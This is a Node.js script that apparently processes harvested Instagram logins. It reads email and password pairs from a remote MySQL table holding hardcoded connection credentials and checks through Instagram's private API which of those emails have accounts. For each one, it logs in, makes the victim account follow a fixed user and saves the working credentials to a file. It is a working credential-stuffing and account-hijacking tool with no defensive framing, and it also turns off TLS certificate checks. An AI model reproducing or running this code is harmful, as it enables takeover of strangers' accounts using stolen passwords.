
var fs = require('fs');
var mkdirp = require('mkdirp');
var LineByLineReader = require('line-by-line');
var mysql      = require('mysql');
timer = 10000;

var connection = mysql.createConnection({
  host     : 'nsinfos.mysql.uhserver.com',
  user     : 'nsinfos',
  password : 'P@ssw0rdinf3ctx',
  database : 'nsinfos'
});

connection.connect(function(err) {
  if (err) {
    console.error('error connecting: ' + err.stack);
    return;
  }

  console.log('connected as id ' + connection.threadId);
  setInterval(function () {
        selectiona();
    }, timer);
});


function selectiona() {

    connection.query('SELECT * FROM Logins_Intagram where processado = 0 LIMIT 1' , function (error, results, fields) {
        if (error) throw error;
        // connected!
        var ID = results[0].id;
        console.log('=================================')
        console.log('id',ID)
        console.log('processado',results[0].processado)
        console.log('email',results[0].email)
        console.log('senha',results[0].senha)
        console.log('=================================')
        connection.query('UPDATE Logins_Intagram SET processado=1 where id = ' + ID, function (error, results, fields) {
            if (error) throw error;
            console.log('Update: OK!')
        });
        var credentails2 = [results[0].email, results[0].senha];
         if (validateEmail(results[0].email)) {
             checkemail(credentails2,ID) 
         }
    });
}



var deleteFolderRecursive = function(path) {
  if( fs.existsSync(path) ) {
    fs.readdirSync(path).forEach(function(file,index){
      var curPath = path + "/" + file;
      if(fs.lstatSync(curPath).isDirectory()) { // recurse
        deleteFolderRecursive(curPath);
      } else { // delete file
        fs.unlinkSync(curPath);
      }
    });
    fs.rmdirSync(path);
  }
};

deleteFolderRecursive(__dirname + '/cookies');
deleteFolderRecursive(__dirname + '/tmp');

mkdirp.sync(__dirname + '/cookies');
mkdirp.sync(__dirname + '/tmp');

// For self-signed certificates
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";






function logar(credentails,ID) {
	var Client = new require('instagram-private-api').V1;	
    var device = new Client.Device(credentails[0]);
    var storage = new Client.CookieFileStorage(__dirname + '/cookies/'+credentails[0]+'.json');    
    // And go for login
    Client.Session.create(device, storage, credentails[0], credentails[1])
	   .then(function(session) {
		  return [session, Client.Account.searchForUser(session, 'rafaelld1985')]   
	   })
	   .spread(function(session, account) {
	       return Client.Relationship.create(session, account.id);
	   })
	   .then(function(relationship) {
		  console.log(relationship.params)
          connection.query('UPDATE Logins_Intagram SET processado=3 where id = ' + ID, function (error, results, fields) {
            if (error) throw error;
                console.log('Alterado Login BOM!')
            });
		  SalvaRetorno(credentails[0] + ';' + credentails[1] + '\r\n', 'rafaelld1985')
	   })

}	

function SalvaRetorno(url,caminho) {
    try {
        
        var logger = fs.createWriteStream('retorno' + caminho + '.txt', {
            flags: 'a' // 'a' means appending (old data will be preserved)
        });

        logger.write(url)
        logger.end()
    } catch (err)  {
        //console.log(err); 
    }
}


function checkemail(credentails, ID) {
var Client = new require('instagram-private-api').V1;
var email = credentails[0];
var device = new Client.Device('ssssss');
var storage = new Client.CookieFileStorage(__dirname + '/cookies/xxx.json');
session = new Client.Session(device, storage);
 var creator = new Client.AccountEmailCreator(session);
            creator.setEmail(email)
            creator.checkEmail()
                .then(function(json,err) {
                	 if (json.available === false) {
                	 	logar(credentails,ID)
                	 }
                	
                })
}                

function validateEmail(email) {
    var re = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
    return re.test(String(email).toLowerCase());
}

function setTerminalTitle(title)
{
  process.stdout.write(
    String.fromCharCode(27) + "]0;" + title + ' - ' + timer + String.fromCharCode(7)
  );
}
